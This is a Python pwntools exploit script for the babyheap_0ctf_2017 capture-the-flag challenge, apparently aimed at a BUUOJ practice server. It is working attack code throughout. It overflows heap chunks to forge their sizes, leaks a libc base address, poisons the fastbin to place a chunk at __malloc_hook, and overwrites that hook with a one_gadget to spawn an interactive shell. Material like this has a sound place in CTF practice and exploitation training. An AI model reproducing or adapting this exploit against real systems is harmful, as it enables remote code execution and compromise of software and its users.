from pwn import *
from LibcSearcher import *
import sys
remote_addr = ["node4.buuoj.cn",29255]
libc=ELF('./libc-2.23.so')
elf = ELF('./babyheap_0ctf_2017_patched')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./babyheap_0ctf_2017_patched")
    context(arch='amd64', os='linux')
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

def allocate(size):
    ru(b'Command: ')
    sl(b'1')
    ru(b'Size: ')
    sl(str(size))

def fill(index, content):
    ru(b'Command: ')
    sl(b'2')
    ru(b'Index: ')
    sl(str(index))
    ru(b'Size: ')
    sl(str(len(content) + 1))
    ru(b'Content: ')
    sl(content)

def free(index):
    ru(b'Command: ')
    sl(b'3')
    ru(b'Index: ')
    sl(str(index))

def dump(index):
    ru(b'Command: ')
    sl(b'4')
    ru(b'Index: ')
    sl(str(index))
    ru(b'Content: \n')
    data = rl()
    return data

#gdb.attach(p)

allocate(0x60)
allocate(0x40)

payload = b'a' * 0x60 + p64(0) + p64(0x71)
fill(0, payload)

allocate(0x100)
allocate(0x60)
payload = b'a' * 0x10 + p64(0) + p64(0x71)
fill(2, payload)

free(1)
allocate(0x60)
payload = b'a' * 0x40 + p64(0) + p64(0x111)
fill(1, payload)

free(2)
libc_base = u64(dump(1)[-9:-1]) - 0x3c27b8 - 0x23c0
pr("leaked", libc_base)

malloc_hook = libc_base + libc.sym['__malloc_hook']
one = libc_base + 0x4526a

pr("malloc_hook", malloc_hook)
pr("one_gadget", one)

free(1)
payload = b'a' * 0x60 + p64(0) + p64(0x71) + p64(malloc_hook - 19) + p64(0)
fill(0, payload)

allocate(0x60)
allocate(0x60)

payload = p8(0) * 3 + p64(one)
fill(2, payload)

allocate(0x60)

shell()
